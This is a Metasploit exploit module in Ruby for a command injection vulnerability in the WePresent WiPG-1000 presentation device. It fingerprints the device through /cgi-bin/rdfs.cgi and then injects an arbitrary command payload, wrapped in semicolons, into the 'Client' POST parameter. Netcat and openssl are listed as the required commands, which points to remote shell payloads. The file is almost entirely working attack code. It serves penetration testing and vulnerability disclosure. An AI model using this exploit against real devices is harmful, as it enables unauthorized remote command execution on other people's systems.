##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'WePresent WiPG-1000 Command Injection',
      'Description'    => %q{
        This module exploits a command injection vulnerability in an undocumented
        CGI file in several versions of the WePresent WiPG-1000 devices.
        Version 2.0.0.7 was confirmed vulnerable, 2.2.3.0 patched this vulnerability.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Matthias Brun', # Vulnerability Discovery, Metasploit Module
        ],
      'References'     =>
        [
          [ 'URL', 'https://www.redguard.ch/advisories/wepresent-wipg1000.txt' ]
        ],
      'Payload'        =>
        {
          'Compat'     =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'generic netcat openssl'
            }
        },
      'Platform'       => ['unix'],
      'Arch'           => ARCH_CMD,
      'Targets'        =>
        [
          ['WiPG-1000 <=2.0.0.7', {}]
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Apr 20 2017',
      'DefaultTarget'  => 0))
  end


  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => '/cgi-bin/rdfs.cgi'
    })
    if res && res.body.include?("Follow administrator instructions to enter the complete path")
      Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    print_status('Sending request')
    send_request_cgi(
      'method' => 'POST',
      'uri'    => '/cgi-bin/rdfs.cgi',
      'vars_post' => {
        'Client' => ";#{payload.encoded};",
        'Download' => 'Download'
      }
    )
  end

end